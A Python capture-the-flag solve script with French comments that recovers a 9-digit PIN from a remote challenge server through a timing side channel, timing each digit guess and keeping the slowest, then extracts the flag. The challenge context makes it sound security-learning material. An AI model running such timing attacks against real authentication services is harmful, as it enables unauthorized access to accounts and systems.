#!/usr/bin/env python3
# Flag Vault — timing attack (side-channel temporel).
#
# chal.py verifie le PIN digit par digit : pour chaque position, si le digit est BON il
# execute une boucle de 10_000_000 iterations (lent) avant de passer au suivant ; si le
# digit est FAUX il sort immediatement (rapide).
#   => le temps de reponse est proportionnel au NOMBRE DE DIGITS CORRECTS EN TETE.
#
# Attaque : on reconstruit le PIN de gauche a droite. A chaque position, en ayant deja
# fixe le prefixe correct, on essaie les 10 chiffres (le reste rempli de '0') et on garde
# celui qui rend la reponse la plus LENTE : c'est le bon (il a franchi une boucle 10M de
# plus que les autres).

import time
from pwn import *

HOST, PORT = "chal.sigpwny.com", 6002
PIN_LEN = 9
ROUNDS = 2          # mesures par chiffre (moyennees) pour lisser le jitter reseau
context.log_level = "error"


def measure(guess: str) -> float:
    """Temps entre l'envoi du PIN et la reponse complete du serveur (EOF)."""
    io = remote(HOST, PORT)
    io.recvuntil(b"Enter the PIN: ")
    t0 = time.time()
    io.sendline(guess.encode())
    data = io.recvall(timeout=60)
    dt = time.time() - t0
    io.close()
    return dt, data


def main():
    known = ""
    for pos in range(PIN_LEN):
        times = {}
        for d in "0123456789":
            guess = known + d + "0" * (PIN_LEN - pos - 1)   # longueur = PIN_LEN
            total = 0.0
            for _ in range(ROUNDS):
                dt, _ = measure(guess)
                total += dt
            times[d] = total / ROUNDS
        best = max(times, key=times.get)
        known += best
        # le bon chiffre doit nettement depasser la mediane des autres
        log.info(f"pos {pos}: {best}  (t={times[best]:.2f}s)  -> PIN={known}")
        print(f"[+] position {pos}: {best}   PIN partiel = {known}")

    print(f"[+] PIN trouve : {known}")
    _, data = measure(known)
    text = data.decode(errors="ignore")
    print(text)
    m = __import__("re").search(r"sigpwny\{[^}]*\}", text)
    if m:
        print(f"[+] FLAG: {m.group()}")


if __name__ == "__main__":
    main()
